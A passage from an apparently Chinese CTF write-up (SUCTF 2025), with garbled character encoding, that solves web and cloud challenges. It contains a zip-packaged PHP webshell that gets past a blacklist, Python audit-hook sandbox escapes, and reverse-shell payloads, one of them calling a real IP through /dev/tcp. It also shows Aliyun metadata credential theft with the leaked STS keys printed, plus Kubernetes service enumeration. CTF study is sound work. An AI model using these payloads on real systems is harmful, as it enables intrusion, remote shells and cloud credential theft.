href="https://twe1v3.top/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BFonezip%E6%8A%A5%E9%94%99%E8%A7%A3%E5%8E%8B">twe1v3.top&#x2F;2022&#x2F;10&#x2F;CTFä¸­zipæ–‡ä»¶çš„ä½¿ç”¨&#x2F;#åˆ©ç”¨å§¿åŠ¿onezipæŠ¥é”™è§£å‹</a></p><p>é‚£ä¹ˆå¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡é»‘åå•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> io<br><br>mf = io.BytesIO()<br><span class="hljs-keyword">with</span> zipfile.ZipFile(mf, mode=<span class="hljs-string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="hljs-keyword">as</span> zf:<br>    zf.writestr(<span class="hljs-string">&#x27;fff.php&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;&#x27;@&lt;?php $a = &quot;sy&quot;.&quot;s&quot;.&quot;tem&quot;; $a(&quot;ls / &quot;);?&gt;&#x27;&#x27;&#x27;</span>)<br>    zf.writestr(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">5000</span>, <span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shell.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(mf.getvalue())<br></code></pre></td></tr></table></figure><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201840200.png" class="" title="image-20250115201840200"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SUCTF&#123;sti1l_w0t3r_Run_d@@p!!!&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-easyk8s-on-aliyun"><a href="#SU-easyk8s-on-aliyun" class="headerlink" title="SU_easyk8s_on_aliyun"></a>SU_easyk8s_on_aliyun</h2><p>å¼€å±€ä¸€ä¸ªpyjailï¼ŒRCEå¾ˆç®€å•ã€‚å½“æ—¶æˆ‘ç»™Räº†å…¥å£æœºæœ‰äº‹å°±å…ˆæ¶¦äº†ã€‚ã€‚ã€‚</p><p>ç½‘ä¸Šä¸€æœå°±èƒ½æœåˆ°èƒ½ç”¨çš„ï¼Œç›´æ¥ç»•audit hookï¼š</p><p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7Dy7D9DRh2YeNK=3x#toc-34">CTF Pyjail æ²™ç®±é€ƒé€¸ç»•è¿‡åˆé›† - å…ˆçŸ¥ç¤¾åŒº</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/ls&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>], [<span class="hljs-string">b&quot;/bin/ls&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶äº†ï¼š</p><p><code>audit.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>DEBUG = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">audit_hook</span>(<span class="hljs-params">event, args</span>):<br>    audit_functions = &#123;<br>        <span class="hljs-string">&quot;os.system&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.Popen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_output&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;_posixsubprocess.fork_exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawn&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnlp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnv&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvpe&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.fork&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;shutil.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlsym&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlopen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> audit_functions:<br>        <span class="hljs-keyword">if</span> DEBUG:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[DEBUG] found event <span class="hljs-subst">&#123;event&#125;</span>&quot;</span>)<br>        policy = audit_functions[event]<br>        <span class="hljs-keyword">if</span> policy[<span class="hljs-string">&quot;ban&quot;</span>]:<br>            strr = <span class="hljs-string">f&quot;AUDIT BAN : Banning FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">raise</span> PermissionError(<span class="hljs-string">f&quot;[AUDIT BANNED]<span class="hljs-subst">&#123;event&#125;</span> is not allowed.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            strr = <span class="hljs-string">f&quot;[DEBUG] AUDIT ALLOW : Allowing FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">return</span><br><br>sys.addaudithook(audit_hook)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ç”¨wgetä¸‹è½½bashæ–‡ä»¶ç„¶åå¼¹shellã€‚</p><p>ä¹Ÿå¯ä»¥ç›´æ¥å¼¹ï¼Œä½†æ˜¯è¦ç”¨base64ä¸ç„¶å¼¹ä¸äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket, os, _posixsubprocess; <br><br>s = socket.socket(); <br>s.connect((<span class="hljs-string">&quot;xxxx&quot;</span>,<span class="hljs-number">9999</span>)); <br>[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">b&quot;echo b64-payload | base64 -d | bash -i&quot;</span>], [<span class="hljs-string">b&quot;/bin/bash&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>).fork_exec(<br>    [<span class="hljs-string">b&quot;/bin/bash&quot;</span>, <span class="hljs-string">b&quot;-c&quot;</span>, <span class="hljs-string">b&quot;bash -i &gt;&amp; /dev/tcp/43.156.25.198/1232 0&gt;&amp;1&quot;</span>],<br>    [<span class="hljs-string">b&quot;/bin/bash&quot;</span>],<br>    <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>    -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,<br>    *(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).pipe()),<br>    <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<br>    <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>    -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span><br>)<br></code></pre></td></tr></table></figure><p>é¢˜ç›®åæç¤ºäº†ä¹Ÿåœ¨<code>aliyun</code>ä¸Šï¼Œå¯ä»¥å»æ‰¾<code>aliyun</code>çš„å…ƒæ•°æ®åœ¨å“ªé‡Œã€‚</p><p>æ¥ä¸‹æ¥æ˜¯äº‘å®‰å…¨çš„å†…å®¹äº†ã€‚</p><p><a href="https://developer.aliyun.com/article/1626332#:~:text=%E5%90%84%E5%A4%A7%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE,%EF%BC%9Ahttp://169.254.169.254/">äº‘ä¸Šæ”»é˜²ï¼šå®ä¾‹å…ƒæ•°æ®ã€æ§åˆ¶å°æ¥ç®¡-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº</a></p><p><a href="https://blog.csdn.net/qq_53577336/article/details/134143524">äº‘å®‰å…¨-äº‘åŸç”ŸåŸºäºå®¹å™¨æ¼æ´çš„é€ƒé€¸è‡ªåŠ¨åŒ–æ‰‹æ³•ï¼ˆCDK checkï¼‰_cve-2020-27151-CSDNåšå®¢</a></p><p>ä¸‹è½½<code>cdk_linux_amd64</code>åè¿›è¡Œä¿¡æ¯æ£€ç´¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget &lt;https://github.com/cdk-team/CDK/releases/download/v1.5.4/cdk_linux_amd64&gt;<br>./cdk_linux_amd64 evaluate<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä»å¾—åˆ°çš„ä¿¡æ¯é‡Œé¢çœ‹è§</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115203407193.png" alt="image-20250115203407193"></p><p>æ¥ä¸‹æ¥éœ€è¦è·å–ç±»ä¼¼ä¸‹é¢çš„ä¿¡æ¯ï¼š</p><p><a href="https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata?spm=a2c6h.12873639.article-detail.4.411f3ff64G0pqs">é€šè¿‡å…ƒæ•°æ®æœåŠ¡ä»ECSå®ä¾‹å†…éƒ¨è·å–å®ä¾‹å±æ€§ç­‰ä¿¡æ¯_äº‘æœåŠ¡å™¨ ECS(ECS)-é˜¿é‡Œäº‘å¸®åŠ©ä¸­å¿ƒ</a></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115203432279.png" alt="image-20250115203432279"></p><p>ç›´æ¥åœ¨è¿™ä¸ªæœºå™¨ä¸Šè·å–<code>sts</code>ï¼Œå³AK&#x2F;SKç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aliyun-ecs-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> http://100.100.100.200/latest/meta-data/ram/security-credentials/oss-root                                                                                    <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                            <br>                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                              <br>100   893  100   893    0     0  28858      0 --:--:-- --:--:-- --:--:-- 29766                                                                                  <br>&#123;   <br>  <span class="hljs-string">&quot;AccessKeyId&quot;</span> : <span class="hljs-string">&quot;STS.NSy4dsFrQgg9T1Sn86HEpSfGm&quot;</span>,                                                                                                                     <br>  <span class="hljs-string">&quot;AccessKeySecret&quot;</span> : <span class="hljs-string">&quot;9ogWdxi5Qff2Fna38xknBakmgdjQfdo5JgNWuSTMQKUt&quot;</span>,                                                                                                   <br>  <span class="hljs-string">&quot;Expiration&quot;</span> : <span class="hljs-string">&quot;2025-01-13T15:30:13Z&quot;</span>,                                                                                                                               <br>  <span class="hljs-string">&quot;SecurityToken&quot;</span> : <span class="hljs-string">&quot;CAIS1AJ1q6Ft5B2yfSjIr5DMf97Hq61w0KXSVhfiijhjRMpcvKPsjzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZ2VAI4zb+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGwgIOoQY+nSmQwGPJReJb+udQu7JKc2gIYBv0ZNFJ1n7EnGlNRYbLXu/Ir1QXq3esyb6gQz4rK4KNHstGUvdUGoABAn1BUz7d7A/upOPE4w5ha3QAIyrqx7EgAlz/SWDlebYSWq5znabX0kKWtpuV6+oyJj01bbVoAV35NSu3P9Snk1Gu7e7fUmuWow+PKQed8YjGF9EQWdanrh6ynUSbzpbltvdPGhG7+HRVOsT7OjQz6gJplt44R5e4cXOlXNhayTAgAA==&quot;</span>,                                                                                              <br>  <span class="hljs-string">&quot;LastUpdated&quot;</span> : <span class="hljs-string">&quot;2025-01-13T09:30:13Z&quot;</span>,                                                                                                                              <br>  <span class="hljs-string">&quot;Code&quot;</span> : <span class="hljs-string">&quot;Success&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥è¿oss browserï¼Œä½†æ˜¯æ¡¶é‡Œæ²¡ä¸œè¥¿ï¼Œä¼°è®¡åˆ äº†ã€‚</p><p>ç„¶åå¯¼å…¥<code>aliyuncli</code>æ¢å¤å†å²ç‰ˆæœ¬ï¼Œå°±æ‰¾åˆ°flagäº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./aliyun.exe configure --mode StsToken //è¾“å…¥å¯¹åº”çš„ak/skï¼Œregionæ˜¯cn-hangzhou<br>./aliyun.exe oss <span class="hljs-built_in">ls</span> //åˆ—å‡ºå·²æœ‰èµ„æº<br>./aliyun.exe oss <span class="hljs-built_in">ls</span> oss://suctf-flag-bucket/oss-flag --all-versions //åˆ—å‡ºæ‰€æœ‰ç‰ˆæœ¬<br>./aliyun.exe oss <span class="hljs-built_in">cat</span> oss://suctf-flag-bucket/oss-flag --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA-- //è¯»å–æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/55dfd2c98f5fe645dfae1e5e6555f641.png" alt="img"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/4eca745d7fb175ac2fe4ffca8bbb20ae.png" alt="img"></p><h2 id="SU-easyk8s"><a href="#SU-easyk8s" class="headerlink" title="SU_easyk8s"></a>SU_easyk8s</h2><p>å…¥å£æœºæ‰“æ³•åŒä¸Šï¼Œä½†æ˜¯åé¢é¢˜ç›®ä¸‹çº¿äº†ï¼Œçœ‹çœ‹å®˜æ–¹ç»™çš„wpå§ï¼š</p><h4 id="Python-Audit-Hook-RCE"><a href="#Python-Audit-Hook-RCE" class="headerlink" title="Python Audit Hook RCE"></a>Python Audit Hook RCE</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">DEBUG=<span class="hljs-literal">True</span>  <span class="hljs-comment"># open debug</span><br><span class="hljs-keyword">import</span> os,sys<br>op = <span class="hljs-built_in">print</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">*args</span>):<br>  t = sys._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&#x27;audit_functions&#x27;</span>]<br>  t[<span class="hljs-string">&quot;os.system&quot;</span>][<span class="hljs-string">&#x27;ban&#x27;</span>]= <span class="hljs-literal">False</span><br>  op(t)<br>  <span class="hljs-keyword">return</span> op(*args)<br><br>os.system(<span class="hljs-string">&quot;ls&quot;</span>) <span class="hljs-comment">## RCE </span><br></code></pre></td></tr></table></figure><p>å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ _posixprocess.fork_exec è¿›è¡Œç»•è¿‡</p><h4 id="Kubernetes-ä¿¡æ¯æ³„æ¼"><a href="#Kubernetes-ä¿¡æ¯æ³„æ¼" class="headerlink" title="Kubernetes ä¿¡æ¯æ³„æ¼"></a>Kubernetes ä¿¡æ¯æ³„æ¼</h4><p><a href="https://gh-proxy.com/github.com/Esonhugh/k8spider/releases/download/v2.6.0-metric/k8spider_v2.6.0-metric_linux_amd64.tar.gz">https://gh-proxy.com/github.com/Esonhugh/k8spider/releases/download/v2.6.0-metric/k8spider_v2.6.0-metric_linux_amd64.tar.gz</a></p><p>ä¸‹è½½æ–°ç‰ˆæœ¬ k8spider å¯¹ä»˜ä»–ï¼Œå…ˆæšä¸¾æœåŠ¡ï¼Œç›´æ¥æšä¸¾å°±å¤±è´¥ï¼Œ -vv çœ‹æŠ¥é”™å¯ä»¥çŸ¥é“ï¼Œåªæœ‰å‰å‡ ä¸ª dns è¯·æ±‚æ­£å¸¸å¤„ç†äº†ï¼Œåå‡ ä¸ªè¯·æ±‚ å…¨éƒ¨ io timeout</p><p>ç„¶è€Œ dns æœåŠ¡å§‹ç»ˆæ˜¯æ­£å¸¸çš„ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹æ˜¯ dns æœåŠ¡è¢«æŸäº›ä¸œè¥¿é™åˆ¶äº†ã€‚å°è¯•ç¼©å°é›†ç¾¤ server cidr å¹¶ä¸”å¾ªç¯è·‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> ./k8spider all -c 10.43.<span class="hljs-variable">$i</span>.1/24 -i 20000 &gt;&gt; res ;<span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">cat</span> res<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.8.117&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;suctf-svc.default.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:5000,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.109.180&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;metrics-server.kube-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.116.179&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;kube-state-metrics.lens-metrics.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:8080,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:100&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.140.10&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:80,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:50&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;nginx-ingress-controller.ingress-nginx.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:50&#125;]&#125;]&#125;<br>&#123;<span class="hljs-string">&quot;Ip&quot;</span>:<span class="hljs-string">&quot;10.43.225.93&quot;</span>,<span class="hljs-string">&quot;SvcDomain&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;SrvRecords&quot;</span>:[&#123;<span class="hljs-string">&quot;Cname&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Srv&quot;</span>:[&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15012,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15010,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:15014,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;,&#123;<span class="hljs-string">&quot;Target&quot;</span>:<span class="hljs-string">&quot;istiod.istio-system.svc.cluster.local.&quot;</span>,<span class="hljs-string">&quot;Port&quot;</span>:443,<span class="hljs-string">&quot;Priority&quot;</span>:0,<span class="hljs-string">&quot;Weight&quot;</span>:25&#125;]&#125;]&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ server ä¹Ÿæœ‰æœåŠ¡ port</p><p>å…³æ³¨ kube-state-metrics.lens-metrics.svc.cluster.local</p><p>è¿™æ˜¯ä¸ª metrics æœåŠ¡ï¼Œå®¹å™¨ä¸­æœ‰ 